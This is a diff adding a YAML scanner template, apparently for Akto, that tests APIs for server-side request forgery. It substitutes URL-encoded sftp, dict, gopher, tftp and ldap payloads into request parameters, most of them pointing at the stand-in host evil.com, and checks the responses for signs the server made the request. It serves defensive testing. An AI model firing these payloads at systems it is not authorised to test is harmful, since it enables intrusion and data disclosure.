@@ -1,0 +1,187 @@
+id: SSRF_ON_PROTOCOL
+info:
+  name: "SSRF Protocol Vulnerability Test"
+  description: "This test checks if the API is vulnerable to SSRF attacks using various protocols (SFTP, DICT, GOPHER, LDAP, TFTP)."
+  details: >
+    "This test aims to identify SSRF vulnerabilities in APIs by attempting to fetch information via different protocols (SFTP, DICT, GOPHER, LDAP, TFTP).
+    If the API allows requests with these protocols and returns a response, it may be vulnerable to SSRF attacks."
+  impact: "Successful exploitation might lead to unauthorized access or information disclosure."
+  category:
+    name: SSRF
+    shortName: Server Side Request Forgery
+    displayName: Server Side Request Forgery (SSRF)
+  subCategory: SSRF_ON_PROTOCOL
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - https://github.com/akto-api-security/akto/issues/137
+    - https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978
+
+api_selection_filters:
+  response_code:
+      gte: 200
+      lt: 205
+  or:
+    - request_payload:
+        for_one:
+          value:
+            contains_either:
+                - http
+          key:
+            extract: http_body_key
+    - query_param:
+        for_one:
+          value:
+            contains_either:
+                - http
+          key:
+            extract: http_query_key
+
+    - request_payload:
+        for_one:
+          value:
+            contains_either:
+                - sftp
+          key:
+            extract: sftp_body_key
+    - query_param:
+        for_one:
+          value:
+            contains_either:
+                - sftp
+          key:
+            extract: sftp_query_key
+
+    - request_payload:
+        for_one:
+          value:
+            contains_either:
+                - dict
+          key:
+            extract: dict_body_key
+    - query_param:
+        for_one:
+          value:
+            contains_either:
+                - dict
+          key:
+            extract: dict_query_key
+
+    - request_payload:
+        for_one:
+          value:
+            contains_either:
+                - gopher
+          key:
+            extract: gopher_body_key
+    - query_param:
+        for_one:
+          value:
+            contains_either:
+                - gopher
+          key:
+            extract: gopher_query_key
+
+    - request_payload:
+        for_one:
+          value:
+            contains_either:
+                - ldap
+          key:
+            extract: ldap_body_key
+    - query_param:
+        for_one:
+          value:
+            contains_either:
+                - ldap
+          key:
+            extract: ldap_query_key
+
+    - request_payload:
+        for_one:
+          value:
+            contains_either:
+                - tftp
+          key:
+            extract: tftp_body_key
+    - query_param:
+        for_one:
+          value:
+            contains_either:
+                - tftp
+          key:
+            extract: tftp_query_key
+
+wordLists:
+  urls:
+    - "sftp%3A%2F%2Fevil.com%3A1337%2F"
+    - "dict%3A%2F%2Fevil.com%3A1337%2F"
+    - "gopher%3A%2F%2Fevil.com%3A1337%2F_Hi%250Assrf%250Atest"
+    - "ldap%3A%2F%2Flocalhost%3A1337%2F%250astats%250aquit"
+    - "tftp%3A%2F%2Fevil.com%3A1337%2FTESTUDPPACKET"
+
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_query_param:
+          http_query_key: ${urls}
+      - modify_body_param:
+          http_body_key: ${urls}    
+      - modify_query_param:
+          sftp_query_key: ${urls}
+      - modify_body_param:
+          sftp_body_key: ${urls}
+          
+      - modify_query_param:
+          dict_query_key: ${urls}
+      - modify_body_param:
+          dict_body_key: ${urls}
+          
+      - modify_query_param:
+          gopher_query_key: ${urls}
+      - modify_body_param:
+          gopher_body_key: ${urls}
+          
+      - modify_query_param:
+          ldap_query_key: ${urls}
+      - modify_body_param:
+          ldap_body_key: ${urls}
+          
+      - modify_query_param:
+          tftp_query_key: ${urls}
+      - modify_body_param:
+          tftp_body_key: ${urls}
+
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  or:
+    response_payload:
+      contains_either:
+        # SFTP
+        - "SSH"
+        - "OpenSSH"
+        # DICT
+        - "220"
+        - "DICT"
+        # GOPHER
+        - "Gopher server"
+        # LDAP
+        - "LDAP"
+        # TFTP
+        - "TFTP server"
+        # Errors
+        - "Unable to establish"
+        - "Unable to connect"
+        - "Unable to access"
+    response_headers:
+      for_one:
+        key:
+          eq: Content-Type
+        value:
+          eq: application/octet-stream
